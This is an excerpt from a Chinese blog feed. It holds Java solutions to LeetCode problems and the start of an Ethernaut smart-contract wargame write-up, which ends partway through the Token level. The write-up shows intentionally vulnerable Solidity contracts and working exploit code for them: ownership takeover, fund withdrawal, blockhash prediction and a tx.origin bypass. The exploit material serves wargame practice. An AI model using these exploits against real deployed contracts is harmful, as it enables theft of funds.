currentNode = currentNode.next，当 currentNode = null 时停止循环。</p><p>使用双指针法来检查是否为回文。我们在起点放置一个指针，在结尾放置一个指针，每一次迭代判断两个指针指向的元素是否相同，若不同，返回 false；相同则将两个指针向内移动，并继续判断，直到两个指针相遇。</p><p>在编码的过程中，注意我们比较的是节点值的大小，而不是节点本身。正确的比较方式是：node_1.val == node_2.val，而 node_1 == node_2 是错误的</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPalindrome</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">       List&lt;Integer&gt; vals = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line"></span><br><span class="line">       <span class="comment">//将链表的值复制到数组中</span></span><br><span class="line">       ListNode currentNode = head;</span><br><span class="line">       <span class="keyword">while</span>(currentNode != <span class="keyword">null</span>)&#123;</span><br><span class="line">           vals.add(currentNode.val);</span><br><span class="line">           currentNode = currentNode.next;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="comment">//使用双指针进行判断</span></span><br><span class="line">       <span class="keyword">int</span> front = <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">int</span> back = vals.size() - <span class="number">1</span>;</span><br><span class="line">       <span class="keyword">while</span>(front &lt; back)&#123;</span><br><span class="line">           <span class="keyword">if</span>(!vals.get(front).equals(vals.get(back)))&#123;</span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">           &#125;</span><br><span class="line">           front++;</span><br><span class="line">           back--;</span><br><span class="line">       &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="16-移动零"><a href="#16-移动零" class="headerlink" title="16.移动零"></a><a href="https://leetcode.cn/problems/move-zeroes/">16.移动零</a></h3><p>给定一个数组 <code>nums</code>，编写一个函数将所有 <code>0</code> 移动到数组的末尾，同时保持非零元素的相对顺序。</p><p><strong>请注意</strong> ，必须在不复制数组的情况下原地对数组进行操作。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入: nums = [0,1,0,3,12]</span><br><span class="line">输出: [1,3,12,0,0]</span><br></pre></td></tr></table></figure><p>思路：创建两个指针 i 和 j，第一次遍历的时候指针 j 用来记录当前有多少非 0 元素，即遍历的时候每遇到一个非 0 元素就将其往数组左边挪，第一次遍历完后，j 指针的下标就指向了最后一个 非 0 元素下标。第二次遍历的时候，起始位置就从 j 开始到结束，将剩下的这段区域内的元素全部置为 0。</p><img src="/image/Hot100.assets/9669b4ffb158eaeeee6f0cd66a70f24411575edab1ab8a037c4c9084b1c743f5-283_1.gif" alt="283_1.gif" style="zoom:50%;" /><p>时间复杂度：<em>O</em>(<em>n</em>)<br>空间复杂度：<em>O</em>(1)</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">moveZeroes</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//第一次遍历的时候，j记录非0的个数，只要是非0就赋值给nums[j]</span></span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i]!=<span class="number">0</span>)&#123;</span><br><span class="line">                nums[j++] = nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//剩下的都是 0，第二次遍历把末尾的元素都赋为0</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = j;  i &lt; nums.length; ++i)&#123;</span><br><span class="line">            nums[i] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>二、一次遍历</strong></p><p>参考了快速排序的思想，快速排序首先要确定一个待分割的元素做中间点 <code>x</code>，然后把所有小于等于 <code>x</code> 的元素放到 <code>x</code> 的左边，大于 <code>x</code> 的元素放到其右边。这里把 0 看作是这个中间点，把不等于 0 的放到中间点的左边，等于 0 的放到右边</p><img src="/image/Hot100.assets/36d1ac5d689101cbf9947465e94753c626eab7fcb736ae2175f5d87ebc85fdf0-283_2.gif" alt="283_2.gif" style="zoom:50%;" /><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">moveZeroes</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(nums == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">       <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">       <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">           <span class="keyword">if</span>(nums[i] != <span class="number">0</span>)&#123;</span><br><span class="line">               <span class="keyword">if</span>(i &gt; j)&#123;</span><br><span class="line">                   nums[j] = nums[i];</span><br><span class="line">                   nums[i] = <span class="number">0</span>;</span><br><span class="line">               &#125;</span><br><span class="line">               j++;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="17-比特位计数"><a href="#17-比特位计数" class="headerlink" title="17. 比特位计数"></a><a href="https://leetcode.cn/problems/counting-bits/">17. 比特位计数</a></h3><p>给你一个整数 <code>n</code> ，对于 <code>0 &lt;= i &lt;= n</code> 中的每个 <code>i</code> ，计算其二进制表示中 <strong><code>1</code> 的个数</strong> ，返回一个长度为 <code>n + 1</code> 的数组 <code>ans</code> 作为答案。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 2</span><br><span class="line">输出：[0,1,1]</span><br><span class="line">解释：</span><br><span class="line">0 --&gt; 0</span><br><span class="line">1 --&gt; 1</span><br><span class="line">2 --&gt; 10</span><br></pre></td></tr></table></figure><p>思路：</p><p>数字可以分为奇数和偶数：</p><ol><li><p>奇数：二进制表示中，奇数一定比前面那个偶数多一个 1，因为多的就是最低位的 1。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">举例：          </span><br><span class="line">0 = 0       1 = 1         2 = 10      3 = 11</span><br></pre></td></tr></table></figure></li><li><p>偶数：二进制表示中，偶数中 1 的个数一定和除以 2 之后的那个数一样多。因为最低位是 0，除以 2 就是右移一位，也就是把那个 0 抹掉而已，所以 1 的个数是不变的。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">举例：</span><br><span class="line">2 = 10       4 = 100       8 = 1000</span><br><span class="line">3 = 11       6 = 110       12 = 1100</span><br></pre></td></tr></table></figure></li></ol><p>0 的 1 个数为 0， 因此可以根据奇偶性进行遍历计算。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] countBits(<span class="keyword">int</span> n) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] res = <span class="keyword">new</span> <span class="keyword">int</span>[n + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</span><br><span class="line">           res[i] = res[i &gt;&gt; <span class="number">1</span>] + (i &amp; <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>二、计算汉明重量</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] countBits(<span class="keyword">int</span> n) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] dp = <span class="keyword">new</span> <span class="keyword">int</span>[n + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            dp[i] = Integer.bitCount(i); <span class="comment">// 计算汉明重量</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="18-找到所有数组中消失的数字"><a href="#18-找到所有数组中消失的数字" class="headerlink" title="18.找到所有数组中消失的数字"></a><a href="https://leetcode.cn/problems/find-all-numbers-disappeared-in-an-array/">18.找到所有数组中消失的数字</a></h3><p>给你一个含 n 个整数的数组 nums ，其中 nums[i] 在区间 [1, n] 内。请你找出所有在 [1, n] 范围内但没有出现在 nums 中的数字，并以数组的形式返回结果。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [4,3,2,7,8,2,3,1]</span><br><span class="line">输出：[5,6]</span><br></pre></td></tr></table></figure><p><strong>思路：哈希表</strong></p><p>使用哈希表存放数组中的每个数组，若存在则存入值为1，然后用一个循环判断，将值为0的健的值放入数组中</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">findDisappearedNumbers</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        Map&lt;Integer,Integer&gt; map = <span class="keyword">new</span>  HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num :nums)&#123;</span><br><span class="line">            <span class="keyword">boolean</span> isTrue = map.get(num) != <span class="keyword">null</span> ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">if</span>((!isTrue))&#123;</span><br><span class="line">                map.put(num,<span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= nums.length ; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(map.getOrDefault(i,<span class="number">0</span>) == <span class="number">0</span>)&#123;</span><br><span class="line">                res.add(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>优化后的代码：</p><p>该用bool型的数组</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">findDisappearedNumbers</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span>[] hash = <span class="keyword">new</span> <span class="keyword">boolean</span>[nums.length + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num : nums)&#123;</span><br><span class="line">            hash[num] = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        List&lt;Integer&gt; res = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= nums.length; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(hash[i] == <span class="keyword">false</span>)&#123;</span><br><span class="line">                res.add(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="19-汉明距离"><a href="#19-汉明距离" class="headerlink" title="19.汉明距离"></a><a href="https://leetcode.cn/problems/hamming-distance/">19.汉明距离</a></h3><p>两个整数之间的 <a href="https://baike.baidu.com/item/%E6%B1%89%E6%98%8E%E8%B7%9D%E7%A6%BB">汉明距离</a> 指的是这两个数字对应二进制位不同的位置的数目。</p><p>给你两个整数 <code>x</code> 和 <code>y</code>，计算并返回它们之间的汉明距离。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：x = 1, y = 4</span><br><span class="line">输出：2</span><br><span class="line">解释：</span><br><span class="line">1   (0 0 0 1)</span><br><span class="line">4   (0 1 0 0)</span><br><span class="line">       ↑   ↑</span><br><span class="line">上面的箭头指出了对应二进制位不同的位置。</span><br></pre></td></tr></table></figure><p>思路：</p><p>一、内置位计数功能</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hammingDistance</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Integer.bitCount(x ^ y);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>时间复杂度o(1)</p><p>空间复杂度o(1)</p><p>二、移位实现计数</p><p>使用位运算中移位的操作实现位计数功能。具体地，记 s=x⊕y，我们可以不断地检查 s 的最低位，如果最低位为 1，那么令计数器加一，然后我们令 s 整体右移一位，这样 s 的最低位将被舍去，原本的次低位就变成了新的最低位。我们重复这个过程直到 s=0 为止。这样计数器中就累计了 s 的二进制表示中 1 的数量。</p><img src="/image/Hot100.assets/2.png" alt="fig2" style="zoom:50%;" /><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hammingDistance</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> s = x ^ y, res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(s != <span class="number">0</span>)&#123;</span><br><span class="line">            res += s &amp; <span class="number">1</span>;</span><br><span class="line">            s &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="20-合并二叉树"><a href="#20-合并二叉树" class="headerlink" title="20.合并二叉树"></a><a href="https://leetcode.cn/problems/merge-two-binary-trees/">20.合并二叉树</a></h3><p>给你两棵二叉树： root1 和 root2 。</p><p>想象一下，当你将其中一棵覆盖到另一棵之上时，两棵树上的一些节点将会重叠（而另一些不会）。你需要将这两棵树合并成一棵新二叉树。合并的规则是：如果两个节点重叠，那么将这两个节点的值相加作为合并后节点的新值；否则，不为 null 的节点将直接作为新二叉树的节点。</p><p>返回合并后的二叉树。</p><p>注意: 合并过程必须从两个树的根节点开始。</p><p><img src="/image/Hot100.assets/image-20230301150755100.png" alt="image-20230301150755100"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：root1 = [1,3,2,5], root2 = [2,1,3,null,4,null,7]</span><br><span class="line">输出：[3,4,5,5,4,null,7]</span><br></pre></td></tr></table></figure><p>思路：</p><p>使用前序遍历，再依次把访问到的节点值相加，因为题目没有说不能改变树的值和结构，我们不用再创建新的节点，直接将树2合并到树1上然后返回即可，当树1与树2不一样时，统一把树2挂到树1。</p><p>递归条件：</p><ul><li>终止条件：树1的节点为null，或者树2的节点为null</li><li>递归函数：将两个树的节点相加后，再赋值给树1的节点。再递归执行两个树的左节点，递归执行两个树的右节点。</li></ul><img src="/image/Hot100.assets/23fbf9388a4193475a7606a6390729f575e3329e0a810d2047682f701d3ddd1f-recursion.gif" alt="recursion.gif" style="zoom:50%;" /><p>时间复杂度：O*(<em>N</em>)<br>空间复杂度：O*(<em>h</em>)，<em>h</em> 是树的高度</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">mergeTrees</span><span class="params">(TreeNode root1, TreeNode root2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root1 == <span class="keyword">null</span> || root2 == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> root1 == <span class="keyword">null</span> ? root2 : root1; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dfs(root1, root2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">TreeNode <span class="title">dfs</span><span class="params">(TreeNode r1, TreeNode r2)</span></span>&#123;</span><br><span class="line">        <span class="comment">//如果r1和r2中只要一个是null，函数就直接返回</span></span><br><span class="line">        <span class="keyword">if</span>(r1 == <span class="keyword">null</span> || r2 == <span class="keyword">null</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> r1 == <span class="keyword">null</span> ? r2 : r1;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//让r1的值等于 r1和r2的值的和，再递归计算两棵树的左右节点</span></span><br><span class="line">        r1.val += r2.val;</span><br><span class="line">        r1.left = dfs(r1.left, r2.left);</span><br><span class="line">        r1.right = dfs(r1.right,r2.right);</span><br><span class="line">        <span class="keyword">return</span> r1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> TreeNode <span class="title">mergeTrees</span><span class="params">(TreeNode root1, TreeNode root2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root1==<span class="keyword">null</span>&amp;&amp;root2==<span class="keyword">null</span>)<span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(root1==<span class="keyword">null</span>)<span class="keyword">return</span> root2;</span><br><span class="line">        <span class="keyword">if</span>(root2==<span class="keyword">null</span>)<span class="keyword">return</span> root1;</span><br><span class="line">        root1.val+=root2.val;</span><br><span class="line">        root1.left=mergeTrees(root1.left,root2.left);</span><br><span class="line">        root1.right=mergeTrees(root1.right,root2.right);</span><br><span class="line">        <span class="keyword">return</span> root1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;1-两数之和&quot;&gt;&lt;a href=&quot;#1-两数之和&quot; class=&quot;headerlink&quot; title=&quot;1. 两数之和&quot;&gt;&lt;/a&gt;&lt;a href=&quot;https://leetcode.cn/problems/two-sum/&quot;&gt;1. 两数之和&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;</summary>
      
    
    
    
    <category term="算法" scheme="https://banana69.site/categories/%E7%AE%97%E6%B3%95/"/>
    
    
  </entry>
  
  <entry>
    <title>Ethernaut 题解</title>
    <link href="https://banana69.site/2023/02/23/Ethernaut/"/>
    <id>https://banana69.site/2023/02/23/Ethernaut/</id>
    <published>2023-02-22T16:00:00.000Z</published>
    <updated>2023-02-23T13:40:06.430Z</updated>
    
    <content type="html"><![CDATA[<h3 id="1-Fallback"><a href="#1-Fallback" class="headerlink" title="1. Fallback"></a>1. Fallback</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Fallback &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address =&gt; uint) public contributions;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    contributions[msg.sender] = 1000 * (1 ether);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function contribute() public payable &#123;</span><br><span class="line">    require(msg.value &lt; 0.001 ether);</span><br><span class="line">    contributions[msg.sender] += msg.value;</span><br><span class="line">    if(contributions[msg.sender] &gt; contributions[owner]) &#123;</span><br><span class="line">      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function getContribution() public view returns (uint) &#123;</span><br><span class="line">    return contributions[msg.sender];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line">    owner.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0);</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过这道题目的要求是取出合约中所有的 ether，但是需要通过 onlyowner 的检查，可以注意到在 <code>receive</code>函数中，<code>owner = msg.sender</code>，所以可以首先向合约中转入ether成为owner，即调用<code>contribute</code>函数转入 ether，然后再调用<code>withdraw</code>函数即可完成该题目。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">contract.contribute(&#123;<span class="attr">value</span>: toWei(<span class="number">0.0005</span>)&#125;)</span><br><span class="line"><span class="comment">//contract.sendTransaction(&#123;value: 1&#125;)</span></span><br><span class="line">contract.withdraw()</span><br></pre></td></tr></table></figure><h3 id="2-Fallout"><a href="#2-Fallout" class="headerlink" title="2. Fallout"></a>2. Fallout</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Fallout &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping (address =&gt; uint) allocations;</span><br><span class="line">  address payable public owner;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> /*</span><br><span class="line"> constructor</span><br><span class="line"> */</span><br><span class="line">  function Fal1out() public payable &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">    allocations[owner] = msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier onlyOwner &#123;</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == owner,</span><br><span class="line">            &quot;caller is not the owner&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  function allocate() public payable &#123;</span><br><span class="line">    allocations[msg.sender] = allocations[msg.sender].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function sendAllocation(address payable allocator) public &#123;</span><br><span class="line">    require(allocations[allocator] &gt; 0);</span><br><span class="line">    allocator.transfer(allocations[allocator]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function collectAllocations() public onlyOwner &#123;</span><br><span class="line">    msg.sender.transfer(address(this).balance);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function allocatorBalance(address allocator) public view returns (uint) &#123;</span><br><span class="line">    return allocations[allocator];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题要求获取合约的所有权，直接调用<code>Fal1out</code>函数就可以成为 owner。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">contract.Fal1out()</span><br></pre></td></tr></table></figure><h3 id="3-Coin-Flip"><a href="#3-Coin-Flip" class="headerlink" title="3. Coin Flip"></a>3. Coin Flip</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">import &#x27;@openzeppelin/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  uint256 public consecutiveWins;</span><br><span class="line">  uint256 lastHash;</span><br><span class="line">  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    consecutiveWins = 0;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function flip(bool _guess) public returns (bool) &#123;</span><br><span class="line">    uint256 blockValue = uint256(blockhash(block.number.sub(1)));</span><br><span class="line"></span><br><span class="line">    if (lastHash == blockValue) &#123;</span><br><span class="line">      revert();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    lastHash = blockValue;</span><br><span class="line">    uint256 coinFlip = blockValue.div(FACTOR);</span><br><span class="line">    bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">    if (side == _guess) &#123;</span><br><span class="line">      consecutiveWins++;</span><br><span class="line">      return true;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      consecutiveWins = 0;</span><br><span class="line">      return false;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>连续猜对 10 次硬币的正反就可以通过该题目。在题目中 <code>flip</code>会获取到前一区块的哈希值去计算硬币的正反，而而每一个随机数都是可知的，所以可以可以预测随机数。</p><p>攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.25;</span><br><span class="line">contract CoinFlip &#123;</span><br><span class="line">function flip(bool _guess) public returns(bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract exploit &#123;</span><br><span class="line"> CoinFlip hack;</span><br><span class="line">     constructor(address instance) public &#123;</span><br><span class="line">        hack = CoinFlip(instance);</span><br><span class="line">    &#125;</span><br><span class="line">    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;</span><br><span class="line"></span><br><span class="line">    function guessFlip() public &#123;</span><br><span class="line">        uint256 blockValue = uint256(blockhash(block.number-1));</span><br><span class="line">        uint256 coinFlip = uint256(uint256(blockValue) / FACTOR);</span><br><span class="line">        bool side = coinFlip == 1 ? true : false;</span><br><span class="line"></span><br><span class="line">        hack.flip(side);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用<code>guessFlip</code> 10 次即可通过该题目。</p><h3 id="4-Telephone"><a href="#4-Telephone" class="headerlink" title="4. Telephone"></a>4. Telephone</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/ SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>tx.origin</code>表示发起交易的用户账户，<code>msg.sender</code>可以表示合约的地址，想要使<code>tx.origin != msg.sender</code>，只需要部署一个合约在合约中调用<code>changeOwner</code>函数即可。</p><p>攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">interface Telephone &#123;</span><br><span class="line">  function changeOwner(address _owner) external;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Caller &#123;</span><br><span class="line">    Telephone hack;</span><br><span class="line">    constructor(address victim) public &#123;</span><br><span class="line">        hack = Telephone(victim);</span><br><span class="line">        hack.changeOwner(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-Token"><a href="#5-Token" class="headerlink" title="5. Token"></a>5. Token</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Token &#123;</span><br><span class="line"></span><br><span class="line">  mapping(address =&gt; uint) balances;</span><br><span class="line">  uint public totalSupply;</span><br><span class="line"></span><br><span class="line">  constructor(uint 